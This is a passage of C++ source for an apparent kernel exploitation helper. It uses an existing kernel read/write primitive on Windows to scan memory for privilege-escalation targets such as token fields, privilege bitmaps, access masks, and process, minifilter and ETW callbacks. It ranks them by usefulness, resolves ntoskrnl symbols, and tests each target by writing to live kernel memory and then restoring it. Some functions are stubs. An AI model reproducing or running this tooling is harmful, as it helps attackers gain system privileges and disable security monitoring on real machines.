                    gadget.address = addr;
                    gadget.size = 8;
                    gadget.original_value = value;
                    gadget.is_writable = CheckWritable(addr);
                    gadget.confidence_score = 75;

                    discovered_gadgets[addr] = gadget;
                    patternCount++;
                }
            }

            uint32_t value32 = rw->ReadUint32(addr);
            if (value32 == 0x1F0FFF || value32 == 0x120089 || value32 == 0x100000) {
                DataGadget gadget;
                gadget.type = GadgetType::GENERIC_ACCESS_MASK;
                gadget.type_name = "ACCESS_MASK";
                gadget.name = "AccessMask_0x" + std::to_string(addr);
                gadget.address = addr;
                gadget.size = 4;
                gadget.original_value = value32;
                gadget.is_writable = CheckWritable(addr);
                gadget.confidence_score = 80;

                discovered_gadgets[addr] = gadget;
                patternCount++;
            }

            if (scannedBytes >= nextLog) {
                std::cout << "    scanned " << (scannedBytes / (1024 * 1024)) << " MB..." << std::endl;
                nextLog += logInterval;
            }
        }
    }

    std::cout << "[+] Found " << patternCount << " pattern-based gadgets" << std::endl;
}

void GadgetDiscoveryEngine::DiscoverFromCrossReferences() {
    std::cout << "[*] Stage 7: Analyzing cross-references..." << std::endl;
    
    int updatedCount = 0;
    
    // For each gadget, try to find what functions access it
    for (auto& [addr, gadget] : discovered_gadgets) {
        auto accessors = FindCrossReferences(addr);
        
        if (!accessors.empty()) {
            discovered_gadgets[addr].accessor_functions = accessors;
            discovered_gadgets[addr].access_count = (uint32_t)accessors.size();
            updatedCount++;
        }
    }
    
    std::cout << "[+] Updated " << updatedCount << " gadgets with cross-reference info" << std::endl;
}

void GadgetDiscoveryEngine::ValidateGadgetsDynamically() {
    std::cout << "[*] Stage 8: Dynamically validating gadgets..." << std::endl;
    
    int validated = 0;
    int tested = 0;
    
    for (auto& [addr, gadget] : discovered_gadgets) {
        if (!gadget.is_writable) continue;
        if (gadget.confidence_score < 50) continue;
        
        tested++;
        
        // Save original
        uint64_t original = gadget.original_value;
        uint64_t testValue = 0;
        
        // Test modification based on type
        bool success = false;
        
        switch (gadget.size) {
            case 4:
                testValue = original ^ 0xFFFFFFFF;
                success = rw->WriteUint32(addr, (uint32_t)testValue);
                break;
            case 8:
                testValue = original ^ 0xFFFFFFFFFFFFFFFF;
                success = rw->WritePointer(addr, testValue);
                break;
        }
        
        if (success) {
            // Verify write
            uint64_t verify = (gadget.size == 4) ? 
                rw->ReadUint32(addr) : rw->ReadPointer(addr);
            
            if (verify == testValue) {
                validated++;
                discovered_gadgets[addr].is_writable = true;
                
                // Restore
                if (gadget.size == 4) {
                    rw->WriteUint32(addr, (uint32_t)original);
                } else {
                    rw->WritePointer(addr, original);
                }
            }
        }
    }
    
    std::cout << "[+] Dynamically validated " << validated << " out of " 
              << tested << " tested gadgets" << std::endl;
}

void GadgetDiscoveryEngine::ScoreGadgets() {
    for (auto& [addr, gadget] : discovered_gadgets) {
        int score = gadget.confidence_score;
        
        // Adjust based on properties
        if (gadget.is_writable) score += 10;
        if (gadget.access_count > 0) score += std::min<int>(static_cast<int>(gadget.access_count) * 2, 20);
        if (gadget.is_triggerable) score += 10;
        
        // Type-specific adjustments
        switch (gadget.type) {
            case GadgetType::TOKEN_FIELD:
            case GadgetType::TOKEN_PRIVILEGES:
            case GadgetType::PROCESS_CALLBACK:
            case GadgetType::MINIFILTER_CALLBACK:
            case GadgetType::ETW_CALLBACK:
            case GadgetType::HANDLE_TABLE_ENTRY_ACCESS:
                score += 20;
                break;
                
            case GadgetType::OBJECT_TYPE_OPEN:
            case GadgetType::OBJECT_TYPE_CLOSE:
            case GadgetType::OBJECT_TYPE_SECURITY:
                score += 15;
                break;
        }
        
        // Cap at 100
        discovered_gadgets[addr].confidence_score = std::min<int>(score, 100);
    }
}

std::vector<DataGadget> GadgetDiscoveryEngine::GetGadgetList() const {
    std::vector<DataGadget> result;
    for (auto& [addr, gadget] : discovered_gadgets) {
        result.push_back(gadget);
    }
    return result;
}

std::vector<DataGadget> GadgetDiscoveryEngine::FilterByType(GadgetType type) const {
    std::vector<DataGadget> result;
    for (auto& [addr, gadget] : discovered_gadgets) {
        if (gadget.type == type) {
            result.push_back(gadget);
        }
    }
    return result;
}

std::vector<DataGadget> GadgetDiscoveryEngine::FilterByScore(int minScore) const {
    std::vector<DataGadget> result;
    for (auto& [addr, gadget] : discovered_gadgets) {
        if (gadget.confidence_score >= minScore) {
            result.push_back(gadget);
        }
    }
    return result;
}

std::vector<DataGadget> GadgetDiscoveryEngine::FilterByProcess(uint64_t processId) const {
    std::vector<DataGadget> result;
    for (auto& [addr, gadget] : discovered_gadgets) {
        if (gadget.process_id == processId) {
            result.push_back(gadget);
        }
    }
    return result;
}

bool GadgetDiscoveryEngine::ExportToJson(const std::string& filename) const {
    std::ofstream file(filename);
    
    if (!file.is_open()) {
        return false;
    }
    
    file << "[" << std::endl;
    
    int count = 0;
    for (auto& [addr, gadget] : discovered_gadgets) {
        file << "  {" << std::endl;
        file << "    \"type\": " << (int)gadget.type << "," << std::endl;
        file << "    \"type_name\": \"" << gadget.type_name << "\"," << std::endl;
        file << "    \"name\": \"" << gadget.name << "\"," << std::endl;
        file << "    \"address\": \"0x" << std::hex << gadget.address << "\"," << std::endl;
        file << "    \"structure\": \"" << gadget.structure_name << "\"," << std::endl;
        file << "    \"field\": \"" << gadget.field_name << "\"," << std::endl;
        file << "    \"offset\": " << std::dec << gadget.field_offset << "," << std::endl;
        file << "    \"size\": " << gadget.size << "," << std::endl;
        file << "    \"original\": \"0x" << std::hex << gadget.original_value << "\"," << std::endl;
        file << "    \"writable\": " << (gadget.is_writable ? "true" : "false") << "," << std::endl;
        file << "    \"confidence\": " << std::dec << gadget.confidence_score << std::endl;
        file << "  }";
        
        if (++count < discovered_gadgets.size()) {
            file << ",";
        }
        file << std::endl;
    }
    
    file << "]" << std::endl;
    file.close();
    
    return true;
}

bool GadgetDiscoveryEngine::ImportFromJson(const std::string& filename) {
    // JSON parsing would be implemented here
    return false;
}

bool GadgetDiscoveryEngine::CheckWritable(uint64_t address) {
    // Simplified - in reality, you'd check page table permissions
    // For now, assume it's writable if we have a write primitive
    return true;
}

bool GadgetDiscoveryEngine::IsKernelCodeAddress(uint64_t address) {
    // Check if address is in kernel code range
    uint64_t kernelStart = 0xFFFFF80000000000;
    uint64_t kernelEnd = 0xFFFFFFFFFFFFFFFF;
    return address >= kernelStart && address < kernelEnd;
}

uint64_t GadgetDiscoveryEngine::GetNtosBase() {
    if (nt_base_cached) return nt_base_cache;

    LPVOID drivers[1024] = {};
    DWORD needed = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed) && needed >= sizeof(LPVOID)) {
        nt_base_cache = reinterpret_cast<uint64_t>(drivers[0]);
        nt_base_cached = true;
    }
    return nt_base_cache;
}

uint64_t GadgetDiscoveryEngine::FindSymbolAddress(const std::string& name) {
    auto nt_base = GetNtosBase();
    if (!nt_base) return 0;

    // Use the same symbol path logic as the dbghelp scan: env DOG_SYMPATH or default to local cache + MS server.
    std::wstring symPath = L"";
    {
        wchar_t envBuf[2048] = {};
        DWORD got = GetEnvironmentVariableW(L"DOG_SYMPATH", envBuf, static_cast<DWORD>(std::size(envBuf)));
        if (got > 0 && got < std::size(envBuf)) {
            symPath.assign(envBuf, got);
        } else {
            symPath = L"srv*C:\\symbols*https://msdl.microsoft.com/download/symbols";
        }
    }

    if (auto rva = symres::ResolveNtoskrnlSymbolRva(name, symPath)) {
        return nt_base + *rva;
    }

    // Fallback: dbghelp lookup (handles non-exported symbols when PDB available)
    HANDLE proc = GetCurrentProcess();
    SymSetOptions(SYMOPT_DEFERRED_LOADS | SYMOPT_UNDNAME);
    if (!SymInitializeW(proc, symPath.c_str(), FALSE)) {
        SymCleanup(proc);
        return 0;
    }
    DWORD64 loadedBase = SymLoadModuleEx(proc, nullptr, nullptr, nullptr, nt_base, 0, nullptr, 0);
    if (!loadedBase) {
        SymCleanup(proc);
        return 0;
    }

    uint64_t addr = 0;
    SYMBOL_INFO_PACKAGE sip{};
    sip.si.SizeOfStruct = sizeof(SYMBOL_INFO);
    sip.si.MaxNameLen = sizeof(sip.name);
    if (SymFromName(proc, name.c_str(), &sip.si)) {
        addr = nt_base + (sip.si.Address - loadedBase);
    } else {
        std::string prefixed = "nt!" + name;
        if (SymFromName(proc, prefixed.c_str(), &sip.si)) {
            addr = nt_base + (sip.si.Address - loadedBase);
        } else {
            std::string prefixed2 = "ntoskrnl.exe!" + name;
            if (SymFromName(proc, prefixed2.c_str(), &sip.si)) {
                addr = nt_base + (sip.si.Address - loadedBase);
            }
        }
    }

    SymUnloadModule64(proc, loadedBase);
    SymCleanup(proc);
    return addr;
}

std::vector<uint64_t> GadgetDiscoveryEngine::FindCrossReferences(uint64_t address) {
    std::vector<uint64_t> references;
    // This would scan kernel code for references to the address
    return references;
}

// Validator functions
bool GadgetDiscoveryEngine::ValidateTokenField(KernelReadWrite* rw, uint64_t addr, uint64_t value) {
    // Token should have low bits cleared (_EX_FAST_REF)
    return (value & 0xF) == 0;
}

bool GadgetDiscoveryEngine::ValidateAccessMask(KernelReadWrite* rw, uint64_t addr, uint64_t value) {
    uint32_t access = (uint32_t)value;
    // Check for common access mask patterns
    return (access & 0xF0000) != 0;
}

bool GadgetDiscoveryEngine::ValidateCallback(KernelReadWrite* rw, uint64_t addr, uint64_t value) {
    // Callback should point to kernel code
    return value > 0xFFFFF80000000000;
}

bool GadgetDiscoveryEngine::ValidateFunctionPointer(KernelReadWrite* rw, uint64_t addr, uint64_t value) {
    // Should point to kernel code
    return value > 0xFFFFF80000000000;
}

bool GadgetDiscoveryEngine::ValidatePointer(KernelReadWrite* rw, uint64_t addr, uint64_t value) {
    return value != 0;
}

bool GadgetDiscoveryEngine::ValidatePrivileges(KernelReadWrite* rw, uint64_t addr, uint64_t value) {
    // Check if it looks like a privilege bitmap
    return value != 0;
}

bool GadgetDiscoveryEngine::ValidateFlags(KernelReadWrite* rw, uint64_t addr, uint64_t value) {
    // Flags are usually small values
    return value < 0x1000;
}

std::string DataGadget::ToJson() const {
    std::stringstream ss;
    ss << "{";
    ss << "\"type\":" << (int)type << ",";
    ss << "\"type_name\":\"" << type_name << "\",";
    ss << "\"name\":\"" << name << "\",";
    ss << "\"address\":\"0x" << std::hex << address << "\",";
    ss << "\"structure\":\"" << structure_name << "\",";
    ss << "\"field\":\"" << field_name << "\",";
    ss << "\"offset\":" << std::dec << field_offset << ",";
    ss << "\"size\":" << size << ",";
    ss << "\"original\":\"0x" << std::hex << original_value << "\",";
    ss << "\"writable\":" << (is_writable ? "true" : "false") << ",";
    ss << "\"confidence\":" << std::dec << confidence_score;
    ss << "}";
    return ss.str();
}

std::string DataGadget::ToString() const {
    std::stringstream ss;
    ss << "[" << type_name << "] " << name << " @ 0x" << std::hex << address;
    ss << " (orig: 0x" << original_value << ")";
    ss << " confidence: " << std::dec << confidence_score;
    return ss.str();
}
